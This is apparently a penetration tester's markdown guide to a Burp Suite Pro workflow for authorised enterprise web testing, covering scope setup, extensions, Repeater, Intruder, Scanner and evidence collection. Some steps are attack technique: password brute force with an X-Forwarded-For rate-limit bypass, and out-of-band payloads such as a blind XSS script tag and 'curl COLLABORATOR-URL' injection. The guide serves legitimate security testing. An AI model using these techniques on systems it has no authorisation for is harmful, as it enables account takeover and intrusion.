# Burp Suite Pro — Enterprise Penetration Testing Workflow

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Tool Mastery — Primary Testing Platform
>
> **Context:** Burp Suite Professional is my primary tool for every web application and API penetration test. This is not a beginner's guide to what Burp is — it is how I actually use it in enterprise engagements: the workflow, the configurations, the features that save hours per engagement, and the techniques that find vulnerabilities automated scanners consistently miss.

---

## 🏗️ Enterprise Engagement Setup (First 30 Minutes)

### Project Configuration

```
1. New Project → "Save to disk" (not temporary)
   → Creates .burp project file with full request history
   → Essential for evidence preservation and report writing

2. Project Options → Connections → Upstream Proxy
   → If enterprise network requires proxy to reach target
   → Add corporate proxy settings here

3. Scope Configuration (critical — do this before browsing):
   Target → Scope → Add in scope:
   - Main app domain: *.company.com
   - API domain: api.company.com
   - CDN if same scope: cdn.company.com

4. Logger → Enable logging
   → Captures everything including responses

5. Proxy → Options → Response Modification:
   ☑ Remove all JavaScript length locks
   ☑ Remove Input Field Length Limits
   ☑ Unhide hidden form fields
   → These allow manual testing of hidden fields directly
```

### Essential Extensions to Install First (BApp Store)

```
Installed at start of every engagement:
  ✓ Autorize          → automatic authorisation testing (IDOR discovery)
  ✓ JWT Editor        → one-click JWT attacks
  ✓ Param Miner       → discovers hidden parameters
  ✓ Turbo Intruder    → high-speed Intruder replacement
  ✓ Logger++          → enhanced logging with filtering
  ✓ Reflected Parameters → finds reflected input (XSS discovery)
  ✓ JS Miner          → extracts endpoints from JavaScript files
  ✓ Software Vulnerability Scanner → matches components to CVEs
  ✓ Active Scan++     → enhanced active scanning rules
```

---

## 🔍 Proxy — The Core of Manual Testing

```
Intercept workflow:
  Proxy → Intercept ON → perform action in browser → review request
  → Forward / Drop / Send to other tools

Key Proxy shortcuts:
  Ctrl+R → Send to Repeater (use constantly)
  Ctrl+I → Send to Intruder
  Ctrl+S → Send to Scanner (Pro only)

HTTP History filtering for enterprise apps (reduces noise):
  Filter → Show only: In-scope items
  Filter → Hide: Image/CSS/JS responses (uncheck media types)
  Filter → Show only status codes: 200, 302, 400, 401, 403, 500
  → Reveals the meaningful traffic without media noise

Search across all history:
  HTTP History → right-click column headers → add "Response Body" column
  Or: use Burp Search (Ctrl+F) to search across all captured responses
  Search for: password, secret, token, api_key, rO0 (Java serial)
  → Often finds sensitive data leaking in responses you scrolled past
```

---

## 🔁 Repeater — Where Real Testing Happens

```
My repeater workflow for every request:
  1. Capture interesting request in Proxy History
  2. Ctrl+R → Send to Repeater
  3. Right-click tab → rename it (e.g. "Login POST", "API Profile GET")
     → With 20+ tabs open, naming saves enormous time
  4. Modify parameter → Ctrl+Shift+Space → Send → inspect response

Comparing requests effectively:
  Send original → note response length (bottom right of Repeater)
  Modify parameter → send again → compare length
  Different length = different behaviour = investigate further

Response analysis tips:
  View: Render (rendered HTML)  ← see the visual result
  View: Hex                     ← detect binary serialised data
  Search bar in response: use to find your injected value
  Response: look at both body AND headers on every test
```

---

## ⚡ Intruder — Bulk Testing

```
Attack types and when to use each:
  Sniper   → Single payload position, one payload list at a time
             Use: IDOR ID enumeration, password brute force
  Pitchfork → Multiple positions, multiple lists, line-by-line pairing
              Use: Username + password spray, IP bypass header + password
  Cluster Bomb → Multiple positions, all combinations
                 Use: Small-scale credential stuffing (2-3 users × passwords)

IDOR enumeration (most common Intruder use):
  Capture: GET /api/invoices/§5523§
  Sniper attack → Numbers payload: 1-10000, step 1
  Columns: Add "Response Length" column
  Sort by Response Length → long responses = data returned = IDOR

Rate limiting bypass setup (Pitchfork):
  Position 1: §password§
  Position 2: X-Forwarded-For: §1.1.1.§1§§  ← incrementing IP last octet
  List 1: common passwords
  List 2: 1, 2, 3, 4... (appended to 1.1.1.)
  → Each attempt appears to come from a different IP

Turbo Intruder (extension) for high-speed attacks:
  Right-click request → Extensions → Turbo Intruder
  Select: examples/race-single-packet-attack.py
  Use for: race conditions, high-volume enumeration
  Speed: 1000s of requests/second vs Intruder's ~1/second (community)
```

---

## 🤖 Scanner (Pro) — Automated Discovery

```
Active Scan best practices for enterprise engagements:
  Right-click any in-scope request → Scan
  Or: Target → Site Map → right-click domain → Scan

Scan configuration for sensitive environments:
  Scan type: Audit only (not crawl) — you control what gets scanned
  Issues: Select All → uncheck "Time-based SQL injection" (too slow)
          Keep: SQL injection, XSS, SSRF, Path traversal, Command injection

  Insertion points:
  ☑ URL parameters
  ☑ Body parameters
  ☑ HTTP headers    ← often missed manually
  ☑ Cookie values
  ☑ Parameter names ← hidden parameter injection

Review scan results critically:
  High confidence = likely real finding, verify in Repeater
  Medium confidence = test manually — false positive rate higher
  Low confidence = usually informational, verify before reporting
  Never report a scanner finding without manual verification
```

---

## 🔧 Essential Pro Features for Enterprise Testing

### Param Miner — Hidden Parameter Discovery

```
Right-click any request → Extensions → Param Miner → Guess params

What it does:
  Sends the same request with hundreds of extra parameters added
  Identifies parameters the application responds to differently
  Finds: hidden debug params, undocumented API fields, feature flags

High-value discoveries:
  ?debug=true      → enables verbose logging
  ?admin=true      → unlocks admin features (mass assignment)
  ?format=json     → switches response format
  &role=admin      → privilege escalation via undocumented param

Run on: Login page, profile endpoints, search endpoints, any form
```

### Autorize — Automatic IDOR Testing

```
Setup:
  Extensions → Autorize → Paste victim user's Authorization header
  → Now browse as admin/privileged user
  → Autorize auto-replays every request with victim's credentials
  → Flags requests where victim gets same response as admin = IDOR!

Colour interpretation:
  Green "Bypassed!" → same response body for victim = access control bypass
  Red "Enforced"   → 403 or different response for victim = protected
  Orange           → same status code but different body length = investigate

Filter: Show only "Bypassed" items
→ Immediate list of all IDOR findings in the application
```

### Collaborator — Out-of-Band Detection

```
Burp menu → Burp Collaborator client → Copy to clipboard
→ Get unique URL: abcdef123.burpcollaborator.net

Use cases:
  Blind SSRF:     inject Collaborator URL in url/src/webhook parameters
  Blind XSS:      <script src="https://COLLABORATOR-URL/x.js"></script>
  DNS rebinding:  monitor for DNS lookups from server
  XXE:            out-of-band XML entity injection
  OS injection:   ping COLLABORATOR-URL or curl COLLABORATOR-URL

Monitoring:
  Collaborator client → Poll now
  Shows: DNS lookups, HTTP requests, SMTP interactions
  Each interaction includes: source IP, timestamp, payload
  → IP confirms the server (not your browser) made the request
```

---

## 📋 Burp Usage in My Enterprise Engagement Workflow

```
Phase 1 — Reconnaissance (1-2 hours):
  → Configure scope, install extensions
  → Browse entire application with Intercept OFF
  → Let Proxy/Spider build the site map
  → Run Param Miner on key endpoints
  → Run JS Miner to extract hidden API endpoints from JavaScript

Phase 2 — Automated Discovery (parallel):
  → Active Scan on all in-scope endpoints
  → Autorize running while I manually test
  → Logger++ capturing everything

Phase 3 — Manual Testing (primary):
  → Repeater for all parameter manipulation
  → Intruder for IDOR enumeration and brute force
  → Collaborator for blind SSRF/XSS detection
  → JWT Editor for any JWT-based auth

Phase 4 — Evidence Collection:
  → Save Project File (.burp)
  → Export: Target → Site Map → Save to XML (full evidence)
  → Screenshots of all confirmed vulnerabilities
  → Each finding: original request + modified request + response
```

---

## 🧭 Key Takeaways

**1. Name your Repeater tabs — enterprise apps have 100+ requests.**
One of the smallest habits with the largest time savings. The moment I send a request to Repeater, I rename the tab. After an 8-hour testing day, navigating through 60 anonymous Repeater tabs wastes significant time.

**2. Autorize runs continuously in the background — let it work.**
Set up Autorize at the start of every engagement. Browse the full application as an admin or privileged user with Autorize monitoring. By the time you start manual testing, Autorize has already flagged every potential IDOR. This alone saves 2-3 hours of manual IDOR testing per engagement.

**3. Burp Collaborator is the difference between finding blind vulnerabilities and missing them.**
Blind SSRF, blind XSS, blind command injection — all of these produce no visible output in the response. Without an out-of-band callback mechanism, you will miss them every time. Keep Collaborator open and poll it regularly throughout the engagement.

**4. Never report scanner findings without Repeater verification.**
A Burp scan that flags "SQL Injection in parameter X" is a lead, not a confirmed finding. Always reproduce in Repeater with a manual payload that produces clear, unambiguous evidence. Every report finding needs: original request, modified request, response showing impact — all captured manually.

---

## 🔗 References
- [PortSwigger Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Burp Suite BApp Store](https://portswigger.net/bappstore)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
